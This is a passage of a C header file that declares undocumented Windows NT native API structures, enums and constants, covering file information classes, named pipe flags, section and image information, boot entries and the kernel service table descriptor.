    BOOLEAN HypervisorConnected;
    BOOLEAN HypervisorDebuggingEnabled;
    BOOLEAN HypervisorPresent;
    BOOLEAN Spare0[5];
    ULONGLONG EnabledEnlightenments;
} SYSTEM_HYPERVISOR_QUERY_INFORMATION, * PSYSTEM_HYPERVISOR_QUERY_INFORMATION;

typedef VOID(NTAPI *PIO_APC_ROUTINE)(
    _In_ PVOID ApcContext,
    _In_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG Reserved
    );

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

typedef struct _SYSTEM_VHD_BOOT_INFORMATION {
    BOOLEAN OsDiskIsVhd;
    ULONG OsVhdFilePathOffset;
    WCHAR OsVhdParentVolume[ANYSIZE_ARRAY];
} SYSTEM_VHD_BOOT_INFORMATION, *PSYSTEM_VHD_BOOT_INFORMATION;

typedef struct _SYSTEM_OBJECTTYPE_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfObjects;
    ULONG NumberOfHandles;
    ULONG TypeIndex;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    ULONG PoolType;
    BOOLEAN SecurityRequired;
    BOOLEAN WaitableObject;
    UNICODE_STRING TypeName;
} SYSTEM_OBJECTTYPE_INFORMATION, *PSYSTEM_OBJECTTYPE_INFORMATION;

typedef struct _SYSTEM_OBJECT_INFORMATION {
    ULONG NextEntryOffset;
    PVOID Object;
    HANDLE CreatorUniqueProcess;
    USHORT CreatorBackTraceIndex;
    USHORT Flags;
    LONG PointerCount;
    LONG HandleCount;
    ULONG PagedPoolCharge;
    ULONG NonPagedPoolCharge;
    HANDLE ExclusiveProcessId;
    PVOID SecurityDescriptor;
    UNICODE_STRING NameInfo;
} SYSTEM_OBJECT_INFORMATION, *PSYSTEM_OBJECT_INFORMATION;

/*
** Boot Entry START
*/

typedef struct _FILE_PATH {
    ULONG Version;
    ULONG Length;
    ULONG Type;
    UCHAR FilePath[ANYSIZE_ARRAY];
} FILE_PATH, *PFILE_PATH;

typedef struct _BOOT_ENTRY {
    ULONG Version;
    ULONG Length;
    ULONG Id;
    ULONG Attributes;
    ULONG FriendlyNameOffset;
    ULONG BootFilePathOffset;
    ULONG OsOptionsLength;
    UCHAR OsOptions[ANYSIZE_ARRAY];
} BOOT_ENTRY, *PBOOT_ENTRY;

typedef struct _BOOT_ENTRY_LIST {
    ULONG NextEntryOffset;
    BOOT_ENTRY BootEntry;
} BOOT_ENTRY_LIST, *PBOOT_ENTRY_LIST;

/*
** Boot Entry END
*/

/*
** File start
*/

#define FILE_SUPERSEDE                          0x00000000
#define FILE_OPEN                               0x00000001
#define FILE_CREATE                             0x00000002
#define FILE_OPEN_IF                            0x00000003
#define FILE_OVERWRITE                          0x00000004
#define FILE_OVERWRITE_IF                       0x00000005
#define FILE_MAXIMUM_DISPOSITION                0x00000005

#define FILE_DIRECTORY_FILE                     0x00000001
#define FILE_WRITE_THROUGH                      0x00000002
#define FILE_SEQUENTIAL_ONLY                    0x00000004
#define FILE_NO_INTERMEDIATE_BUFFERING          0x00000008

#define FILE_SYNCHRONOUS_IO_ALERT               0x00000010
#define FILE_SYNCHRONOUS_IO_NONALERT            0x00000020
#define FILE_NON_DIRECTORY_FILE                 0x00000040
#define FILE_CREATE_TREE_CONNECTION             0x00000080

#define FILE_COMPLETE_IF_OPLOCKED               0x00000100
#define FILE_NO_EA_KNOWLEDGE                    0x00000200
#define FILE_OPEN_FOR_RECOVERY                  0x00000400
#define FILE_RANDOM_ACCESS                      0x00000800

#define FILE_DELETE_ON_CLOSE                    0x00001000
#define FILE_OPEN_BY_FILE_ID                    0x00002000
#define FILE_OPEN_FOR_BACKUP_INTENT             0x00004000
#define FILE_NO_COMPRESSION                     0x00008000

#define FILE_RESERVE_OPFILTER                   0x00100000
#define FILE_OPEN_REPARSE_POINT                 0x00200000
#define FILE_OPEN_NO_RECALL                     0x00400000
#define FILE_OPEN_FOR_FREE_SPACE_QUERY          0x00800000


#define FILE_COPY_STRUCTURED_STORAGE            0x00000041
#define FILE_STRUCTURED_STORAGE                 0x00000441

#define FILE_VALID_OPTION_FLAGS                 0x00ffffff
#define FILE_VALID_PIPE_OPTION_FLAGS            0x00000032
#define FILE_VALID_MAILSLOT_OPTION_FLAGS        0x00000032
#define FILE_VALID_SET_FLAGS                    0x00000036

typedef enum _FILE_INFORMATION_CLASS {
    FileDirectoryInformation = 1,
    FileFullDirectoryInformation,
    FileBothDirectoryInformation,
    FileBasicInformation,
    FileStandardInformation,
    FileInternalInformation,
    FileEaInformation,
    FileAccessInformation,
    FileNameInformation,
    FileRenameInformation,
    FileLinkInformation,
    FileNamesInformation,
    FileDispositionInformation,
    FilePositionInformation,
    FileFullEaInformation,
    FileModeInformation,
    FileAlignmentInformation,
    FileAllInformation,
    FileAllocationInformation,
    FileEndOfFileInformation,
    FileAlternateNameInformation,
    FileStreamInformation,
    FilePipeInformation,
    FilePipeLocalInformation,
    FilePipeRemoteInformation,
    FileMailslotQueryInformation,
    FileMailslotSetInformation,
    FileCompressionInformation,
    FileObjectIdInformation,
    FileCompletionInformation,
    FileMoveClusterInformation,
    FileQuotaInformation,
    FileReparsePointInformation,
    FileNetworkOpenInformation,
    FileAttributeTagInformation,
    FileTrackingInformation,
    FileIdBothDirectoryInformation,
    FileIdFullDirectoryInformation,
    FileValidDataLengthInformation,
    FileShortNameInformation,
    FileIoCompletionNotificationInformation,
    FileIoStatusBlockRangeInformation,
    FileIoPriorityHintInformation,
    FileSfioReserveInformation,
    FileSfioVolumeInformation,
    FileHardLinkInformation,
    FileProcessIdsUsingFileInformation,
    FileNormalizedNameInformation,
    FileNetworkPhysicalNameInformation,
    FileIdGlobalTxDirectoryInformation,
    FileIsRemoteDeviceInformation,
    FileUnusedInformation,
    FileNumaNodeInformation,
    FileStandardLinkInformation,
    FileRemoteProtocolInformation,
    FileRenameInformationBypassAccessCheck,
    FileLinkInformationBypassAccessCheck,
    FileVolumeNameInformation,
    FileIdInformation,
    FileIdExtdDirectoryInformation,
    FileReplaceCompletionInformation,
    FileHardLinkFullIdInformation,
    FileIdExtdBothDirectoryInformation,
    FileDispositionInformationEx,
    FileRenameInformationEx,
    FileRenameInformationExBypassAccessCheck,
    FileDesiredStorageClassInformation,
    FileStatInformation,
    FileMemoryPartitionInformation,
    FileStatLxInformation,
    FileCaseSensitiveInformation,
    FileLinkInformationEx,
    FileLinkInformationExBypassAccessCheck,
    FileStorageReserveIdInformation,
    FileCaseSensitiveInformationForceAccessCheck,
    FileKnownFolderInformation,
    FileStatBasicInformation,
    FileId64ExtdDirectoryInformation,
    FileId64ExtdBothDirectoryInformation,
    FileIdAllExtdDirectoryInformation,
    FileIdAllExtdBothDirectoryInformation,
    FileStreamReservationInformation,
    FileMaximumInformation
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;

typedef enum _FSINFOCLASS {
    FileFsVolumeInformation = 1,
    FileFsLabelInformation,
    FileFsSizeInformation,
    FileFsDeviceInformation,
    FileFsAttributeInformation,
    FileFsControlInformation,
    FileFsFullSizeInformation,
    FileFsObjectIdInformation,
    FileFsDriverPathInformation,
    FileFsVolumeFlagsInformation,
    FileFsSectorSizeInformation,
    FileFsDataCopyInformation,
    FileFsMetadataSizeInformation,
    FileFsFullSizeInformationEx,
    FileFsGuidInformation,
    FileFsMaximumInformation
} FS_INFORMATION_CLASS, *PFS_INFORMATION_CLASS;

typedef struct _FILE_BASIC_INFORMATION {
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    ULONG FileAttributes;
} FILE_BASIC_INFORMATION, *PFILE_BASIC_INFORMATION;

typedef struct _FILE_STANDARD_INFORMATION {
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG NumberOfLinks;
    UCHAR DeletePending;
    UCHAR Directory;
} FILE_STANDARD_INFORMATION;

typedef struct _FILE_STANDARD_INFORMATION_EX {
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG NumberOfLinks;
    BOOLEAN DeletePending;
    BOOLEAN Directory;
    BOOLEAN AlternateStream;
    BOOLEAN MetadataAttribute;
} FILE_STANDARD_INFORMATION_EX, *PFILE_STANDARD_INFORMATION_EX;

typedef struct _FILE_INTERNAL_INFORMATION {
    LARGE_INTEGER IndexNumber;
} FILE_INTERNAL_INFORMATION, *PFILE_INTERNAL_INFORMATION;

typedef struct _FILE_EA_INFORMATION {
    ULONG EaSize;
} FILE_EA_INFORMATION, *PFILE_EA_INFORMATION;

typedef struct _FILE_ACCESS_INFORMATION {
    ACCESS_MASK AccessFlags;
} FILE_ACCESS_INFORMATION, *PFILE_ACCESS_INFORMATION;

typedef struct _FILE_POSITION_INFORMATION {
    LARGE_INTEGER CurrentByteOffset;
} FILE_POSITION_INFORMATION, *PFILE_POSITION_INFORMATION;

typedef struct _FILE_MODE_INFORMATION {
    ULONG Mode;
} FILE_MODE_INFORMATION, *PFILE_MODE_INFORMATION;

typedef struct _FILE_ALIGNMENT_INFORMATION {
    ULONG AlignmentRequirement;
} FILE_ALIGNMENT_INFORMATION, *PFILE_ALIGNMENT_INFORMATION;

typedef struct _FILE_NAME_INFORMATION {
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;

typedef struct _FILE_ALL_INFORMATION {
    FILE_BASIC_INFORMATION BasicInformation;
    FILE_STANDARD_INFORMATION StandardInformation;
    FILE_INTERNAL_INFORMATION InternalInformation;
    FILE_EA_INFORMATION EaInformation;
    FILE_ACCESS_INFORMATION AccessInformation;
    FILE_POSITION_INFORMATION PositionInformation;
    FILE_MODE_INFORMATION ModeInformation;
    FILE_ALIGNMENT_INFORMATION AlignmentInformation;
    FILE_NAME_INFORMATION NameInformation;
} FILE_ALL_INFORMATION, *PFILE_ALL_INFORMATION;

typedef struct _FILE_NETWORK_OPEN_INFORMATION {
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG FileAttributes;
} FILE_NETWORK_OPEN_INFORMATION, *PFILE_NETWORK_OPEN_INFORMATION;

typedef struct _FILE_ATTRIBUTE_TAG_INFORMATION {
    ULONG FileAttributes;
    ULONG ReparseTag;
} FILE_ATTRIBUTE_TAG_INFORMATION, *PFILE_ATTRIBUTE_TAG_INFORMATION;

typedef struct _FILE_ALLOCATION_INFORMATION {
    LARGE_INTEGER AllocationSize;
} FILE_ALLOCATION_INFORMATION, *PFILE_ALLOCATION_INFORMATION;

typedef struct _FILE_COMPRESSION_INFORMATION {
    LARGE_INTEGER CompressedFileSize;
    USHORT CompressionFormat;
    UCHAR CompressionUnitShift;
    UCHAR ChunkShift;
    UCHAR ClusterShift;
    UCHAR Reserved[3];
} FILE_COMPRESSION_INFORMATION, *PFILE_COMPRESSION_INFORMATION;

typedef struct _FILE_DISPOSITION_INFORMATION {
    BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION;

typedef struct _FILE_END_OF_FILE_INFORMATION {
    LARGE_INTEGER EndOfFile;
} FILE_END_OF_FILE_INFORMATION, *PFILE_END_OF_FILE_INFORMATION;

typedef struct _FILE_VALID_DATA_LENGTH_INFORMATION {
    LARGE_INTEGER ValidDataLength;
} FILE_VALID_DATA_LENGTH_INFORMATION, *PFILE_VALID_DATA_LENGTH_INFORMATION;

typedef struct _FILE_LINK_INFORMATION {
    BOOLEAN ReplaceIfExists;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_LINK_INFORMATION, *PFILE_LINK_INFORMATION;

typedef struct _FILE_MOVE_CLUSTER_INFORMATION {
    ULONG ClusterCount;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_MOVE_CLUSTER_INFORMATION, *PFILE_MOVE_CLUSTER_INFORMATION;

typedef struct _FILE_RENAME_INFORMATION {
    BOOLEAN ReplaceIfExists;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_RENAME_INFORMATION, *PFILE_RENAME_INFORMATION;

typedef struct _FILE_STREAM_INFORMATION {
    ULONG NextEntryOffset;
    ULONG StreamNameLength;
    LARGE_INTEGER StreamSize;
    LARGE_INTEGER StreamAllocationSize;
    WCHAR StreamName[1];
} FILE_STREAM_INFORMATION, *PFILE_STREAM_INFORMATION;

typedef struct _FILE_TRACKING_INFORMATION {
    HANDLE DestinationFile;
    ULONG ObjectInformationLength;
    CHAR ObjectInformation[1];
} FILE_TRACKING_INFORMATION, *PFILE_TRACKING_INFORMATION;

typedef struct _FILE_COMPLETION_INFORMATION {
    HANDLE Port;
    PVOID Key;
} FILE_COMPLETION_INFORMATION, *PFILE_COMPLETION_INFORMATION;

//
// Define the NamedPipeType flags for NtCreateNamedPipeFile
//

#define FILE_PIPE_BYTE_STREAM_TYPE      0x00000000
#define FILE_PIPE_MESSAGE_TYPE          0x00000001

//
// Define the CompletionMode flags for NtCreateNamedPipeFile
//

#define FILE_PIPE_QUEUE_OPERATION       0x00000000
#define FILE_PIPE_COMPLETE_OPERATION    0x00000001

//
// Define the ReadMode flags for NtCreateNamedPipeFile
//

#define FILE_PIPE_BYTE_STREAM_MODE      0x00000000
#define FILE_PIPE_MESSAGE_MODE          0x00000001

//
// Define the NamedPipeConfiguration flags for NtQueryInformation
//

#define FILE_PIPE_INBOUND               0x00000000
#define FILE_PIPE_OUTBOUND              0x00000001
#define FILE_PIPE_FULL_DUPLEX           0x00000002

//
// Define the NamedPipeState flags for NtQueryInformation
//

#define FILE_PIPE_DISCONNECTED_STATE    0x00000001
#define FILE_PIPE_LISTENING_STATE       0x00000002
#define FILE_PIPE_CONNECTED_STATE       0x00000003
#define FILE_PIPE_CLOSING_STATE         0x00000004

//
// Define the NamedPipeEnd flags for NtQueryInformation
//

#define FILE_PIPE_CLIENT_END            0x00000000
#define FILE_PIPE_SERVER_END            0x00000001


typedef struct _FILE_PIPE_INFORMATION {
    ULONG ReadMode;
    ULONG CompletionMode;
} FILE_PIPE_INFORMATION, *PFILE_PIPE_INFORMATION;

typedef struct _FILE_PIPE_LOCAL_INFORMATION {
    ULONG NamedPipeType;
    ULONG NamedPipeConfiguration;
    ULONG MaximumInstances;
    ULONG CurrentInstances;
    ULONG InboundQuota;
    ULONG ReadDataAvailable;
    ULONG OutboundQuota;
    ULONG WriteQuotaAvailable;
    ULONG NamedPipeState;
    ULONG NamedPipeEnd;
} FILE_PIPE_LOCAL_INFORMATION, *PFILE_PIPE_LOCAL_INFORMATION;

typedef struct _FILE_PIPE_REMOTE_INFORMATION {
    LARGE_INTEGER CollectDataTime;
    ULONG MaximumCollectionCount;
} FILE_PIPE_REMOTE_INFORMATION, *PFILE_PIPE_REMOTE_INFORMATION;

typedef struct _FILE_MAILSLOT_QUERY_INFORMATION {
    ULONG MaximumMessageSize;
    ULONG MailslotQuota;
    ULONG NextMessageSize;
    ULONG MessagesAvailable;
    LARGE_INTEGER ReadTimeout;
} FILE_MAILSLOT_QUERY_INFORMATION, *PFILE_MAILSLOT_QUERY_INFORMATION;

typedef struct _FILE_MAILSLOT_SET_INFORMATION {
    PLARGE_INTEGER ReadTimeout;
} FILE_MAILSLOT_SET_INFORMATION, *PFILE_MAILSLOT_SET_INFORMATION;

typedef struct _FILE_REPARSE_POINT_INFORMATION {
    LONGLONG FileReference;
    ULONG Tag;
} FILE_REPARSE_POINT_INFORMATION, *PFILE_REPARSE_POINT_INFORMATION;

typedef struct _FILE_LINK_ENTRY_INFORMATION {
    ULONG NextEntryOffset;
    LONGLONG ParentFileId;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_LINK_ENTRY_INFORMATION, *PFILE_LINK_ENTRY_INFORMATION;

typedef struct _FILE_LINKS_INFORMATION {
    ULONG BytesNeeded;
    ULONG EntriesReturned;
    FILE_LINK_ENTRY_INFORMATION Entry;
} FILE_LINKS_INFORMATION, *PFILE_LINKS_INFORMATION;

typedef struct _FILE_NETWORK_PHYSICAL_NAME_INFORMATION {
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NETWORK_PHYSICAL_NAME_INFORMATION, *PFILE_NETWORK_PHYSICAL_NAME_INFORMATION;

typedef struct _FILE_STANDARD_LINK_INFORMATION {
    ULONG NumberOfAccessibleLinks;
    ULONG TotalNumberOfLinks;
    BOOLEAN DeletePending;
    BOOLEAN Directory;
} FILE_STANDARD_LINK_INFORMATION, *PFILE_STANDARD_LINK_INFORMATION;

typedef struct _FILE_SFIO_RESERVE_INFORMATION {
    ULONG RequestsPerPeriod;
    ULONG Period;
    BOOLEAN RetryFailures;
    BOOLEAN Discardable;
    ULONG RequestSize;
    ULONG NumOutstandingRequests;
} FILE_SFIO_RESERVE_INFORMATION, *PFILE_SFIO_RESERVE_INFORMATION;

typedef struct _FILE_SFIO_VOLUME_INFORMATION {
    ULONG MaximumRequestsPerPeriod;
    ULONG MinimumPeriod;
    ULONG MinimumTransferSize;
} FILE_SFIO_VOLUME_INFORMATION, *PFILE_SFIO_VOLUME_INFORMATION;

//
// Define the flags for NtSet(Query)EaFile service structure entries
//

#define FILE_NEED_EA                    0x00000080

//
// Define EA type values
//

#define FILE_EA_TYPE_BINARY             0xfffe
#define FILE_EA_TYPE_ASCII              0xfffd
#define FILE_EA_TYPE_BITMAP             0xfffb
#define FILE_EA_TYPE_METAFILE           0xfffa
#define FILE_EA_TYPE_ICON               0xfff9
#define FILE_EA_TYPE_EA                 0xffee
#define FILE_EA_TYPE_MVMT               0xffdf
#define FILE_EA_TYPE_MVST               0xffde
#define FILE_EA_TYPE_ASN1               0xffdd
#define FILE_EA_TYPE_FAMILY_IDS         0xff01

typedef struct _FILE_FULL_EA_INFORMATION {
    ULONG NextEntryOffset;
    UCHAR Flags;
    UCHAR EaNameLength;
    USHORT EaValueLength;
    CHAR EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;

typedef struct _FILE_GET_EA_INFORMATION {
    ULONG NextEntryOffset;
    UCHAR EaNameLength;
    CHAR EaName[1];
} FILE_GET_EA_INFORMATION, *PFILE_GET_EA_INFORMATION;

typedef struct _FILE_GET_QUOTA_INFORMATION {
    ULONG NextEntryOffset;
    ULONG SidLength;
    SID Sid;
} FILE_GET_QUOTA_INFORMATION, *PFILE_GET_QUOTA_INFORMATION;

typedef struct _FILE_QUOTA_INFORMATION {
    ULONG NextEntryOffset;
    ULONG SidLength;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER QuotaUsed;
    LARGE_INTEGER QuotaThreshold;
    LARGE_INTEGER QuotaLimit;
    SID Sid;
} FILE_QUOTA_INFORMATION, *PFILE_QUOTA_INFORMATION;

typedef struct _FILE_DIRECTORY_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;

typedef struct _FILE_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    WCHAR FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;

typedef struct _FILE_ID_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, *PFILE_ID_FULL_DIR_INFORMATION;

typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;

typedef struct _FILE_NAMES_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;

typedef struct _FILE_OBJECTID_INFORMATION {
    LONGLONG FileReference;
    UCHAR ObjectId[16];
    union {
        struct {
            UCHAR BirthVolumeId[16];
            UCHAR BirthObjectId[16];
            UCHAR DomainId[16];
        };
        UCHAR ExtendedInfo[48];
    };
} FILE_OBJECTID_INFORMATION, *PFILE_OBJECTID_INFORMATION;

typedef struct _FILE_FS_VOLUME_INFORMATION {
    LARGE_INTEGER VolumeCreationTime;
    ULONG         VolumeSerialNumber;
    ULONG         VolumeLabelLength;
    BOOLEAN       SupportsObjects;
    WCHAR         VolumeLabel[1];
} FILE_FS_VOLUME_INFORMATION, *PFILE_FS_VOLUME_INFORMATION;

typedef struct _FILE_ID_GLOBAL_TX_DIR_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    LARGE_INTEGER FileId;
    GUID LockingTransactionId;
    ULONG TxInfoFlags;
    WCHAR FileName[1];
} FILE_ID_GLOBAL_TX_DIR_INFORMATION, *PFILE_ID_GLOBAL_TX_DIR_INFORMATION;

/*
** File END
*/

/*
** Section START
*/

typedef enum _SECTION_INFORMATION_CLASS {
    SectionBasicInformation,
    SectionImageInformation,
    SectionRelocationInformation,
    SectionOriginalBaseInformation,
    SectionInternalImageInformation,
    MaxSectionInfoClass
} SECTION_INFORMATION_CLASS;

typedef struct _SECTION_BASIC_INFO {
    PVOID BaseAddress;
    ULONG AllocationAttributes;
    LARGE_INTEGER MaximumSize;
} SECTION_BASIC_INFORMATION, *PSECTION_BASIC_INFORMATION;

typedef struct _SECTION_IMAGE_INFORMATION {
    PVOID TransferAddress;
    ULONG ZeroBits;
    SIZE_T MaximumStackSize;
    SIZE_T CommittedStackSize;
    ULONG SubSystemType;
    union {
        struct {
            USHORT SubSystemMinorVersion;
            USHORT SubSystemMajorVersion;
        };
        ULONG SubSystemVersion;
    };
    union
    {
        struct
        {
            USHORT MajorOperatingSystemVersion;
            USHORT MinorOperatingSystemVersion;
        };
        ULONG OperatingSystemVersion;
    };
    USHORT ImageCharacteristics;
    USHORT DllCharacteristics;
    USHORT Machine;
    BOOLEAN ImageContainsCode;
    union
    {
        UCHAR ImageFlags;
        struct
        {
            UCHAR ComPlusNativeReady : 1;
            UCHAR ComPlusILOnly : 1;
            UCHAR ImageDynamicallyRelocated : 1;
            UCHAR ImageMappedFlat : 1;
            UCHAR BaseBelow4gb : 1;
            UCHAR ComPlusPrefer32bit : 1;
            UCHAR Reserved : 2;
        };
    };
    ULONG LoaderFlags;
    ULONG ImageFileSize;
    ULONG CheckSum;
} SECTION_IMAGE_INFORMATION, *PSECTION_IMAGE_INFORMATION;

typedef struct _MI_EXTRA_IMAGE_INFORMATION {
    ULONG SizeOfHeaders;
    ULONG SizeOfImage;
} MI_EXTRA_IMAGE_INFORMATION, *PMI_EXTRA_IMAGE_INFORMATION;

typedef struct _MI_SECTION_IMAGE_INFORMATION {
    SECTION_IMAGE_INFORMATION ExportedImageInformation;
    MI_EXTRA_IMAGE_INFORMATION InternalImageInformation;
} MI_SECTION_IMAGE_INFORMATION, *PMI_SECTION_IMAGE_INFORMATION;

typedef struct _SECTION_IMAGE_INFORMATION64 {
    ULONGLONG TransferAddress;
    ULONG ZeroBits;
    ULONGLONG MaximumStackSize;
    ULONGLONG CommittedStackSize;
    ULONG SubSystemType;
    union {
        struct {
            USHORT SubSystemMinorVersion;
            USHORT SubSystemMajorVersion;
        };
        ULONG SubSystemVersion;
    };
    union
    {
        struct
        {
            USHORT MajorOperatingSystemVersion;
            USHORT MinorOperatingSystemVersion;
        };
        ULONG OperatingSystemVersion;
    };
    USHORT ImageCharacteristics;
    USHORT DllCharacteristics;
    USHORT Machine;
    BOOLEAN ImageContainsCode;
    union
    {
        UCHAR ImageFlags;
        struct
        {
            UCHAR ComPlusNativeReady : 1;
            UCHAR ComPlusILOnly : 1;
            UCHAR ImageDynamicallyRelocated : 1;
            UCHAR ImageMappedFlat : 1;
            UCHAR BaseBelow4gb : 1;
            UCHAR ComPlusPrefer32bit : 1;
            UCHAR Reserved : 2;
        };
    };
    ULONG LoaderFlags;
    ULONG ImageFileSize;
    ULONG CheckSum;
} SECTION_IMAGE_INFORMATION64, *PSECTION_IMAGE_INFORMATION64;

typedef struct _SECTION_INTERNAL_IMAGE_INFORMATION {
    SECTION_IMAGE_INFORMATION SectionInformation;
    union
    {
        ULONG ExtendedFlags;
        struct
        {
            ULONG ImageExportSuppressionEnabled : 1;
            ULONG ImageCetShadowStacksReady : 1; // 20H1
            ULONG ImageXfgEnabled : 1; // 20H2
            ULONG ImageCetShadowStacksStrictMode : 1;
            ULONG ImageCetSetContextIpValidationRelaxedMode : 1;
            ULONG ImageCetDynamicApisAllowInProc : 1;
            ULONG ImageCetDowngradeReserved1 : 1;
            ULONG ImageCetDowngradeReserved2 : 1;
            ULONG Reserved : 24;
        };
    };
} SECTION_INTERNAL_IMAGE_INFORMATION, * PSECTION_INTERNAL_IMAGE_INFORMATION;

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

#ifndef SEC_BASED
#define SEC_BASED          0x200000
#endif

#ifndef SEC_NO_IMAGE
#define SEC_NO_CHANGE      0x400000
#endif

#ifndef SEC_FILE
#define SEC_FILE           0x800000     
#endif

#ifndef SEC_IMAGE
#define SEC_IMAGE         0x1000000     
#endif

#ifndef SEC_RESERVE
#define SEC_RESERVE       0x4000000     
#endif

#ifndef SEC_COMMIT
#define SEC_COMMIT        0x8000000     
#endif

#ifndef SEC_NOCACHE
#define SEC_NOCACHE      0x10000000     
#endif

#ifndef SEC_GLOBAL
#define SEC_GLOBAL       0x20000000
#endif

#ifndef SEC_LARGE_PAGES
#define SEC_LARGE_PAGES  0x80000000    
#endif

/*
** Section END
*/

/*
** System Table START
*/
#define NUMBER_SERVICE_TABLES 2
#define NTOS_SERVICE_INDEX   0
#define WIN32K_SERVICE_INDEX 1
#define SERVICE_NUMBER_MASK ((1 << 12) -  1)

#if defined(_WIN64)

#if defined(_AMD64_)

#define SERVICE_TABLE_SHIFT (12 - 4)
#define SERVICE_TABLE_MASK (((1 << 1) - 1) << 4)
#define SERVICE_TABLE_TEST (WIN32K_SERVICE_INDEX << 4)

#else

#define SERVICE_TABLE_SHIFT (12 - 5)
#define SERVICE_TABLE_MASK (((1 << 1) - 1) << 5)
#define SERVICE_TABLE_TEST (WIN32K_SERVICE_INDEX << 5)

#endif

#else

#define SERVICE_TABLE_SHIFT (12 - 4)
#define SERVICE_TABLE_MASK (((1 << 1) - 1) << 4)
#define SERVICE_TABLE_TEST (WIN32K_SERVICE_INDEX << 4)

#endif

typedef struct _KSERVICE_TABLE_DESCRIPTOR {
    ULONG_PTR Base; //e.g. KiServiceTable
    PULONG Count;
    ULONG Limit;//e.g. KiServiceLimit
    PUCHAR Number; //e.g. KiArgumentTable
} KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;
/*
** System Table END
*/

/*
** System Boot Environment START
*/

// Size=20
typedef struct _SYSTEM_BOOT_ENVIRONMENT_INFORMATION_V1 {
    GUID BootIdentifier;
    FIRMWARE_TYPE FirmwareType;
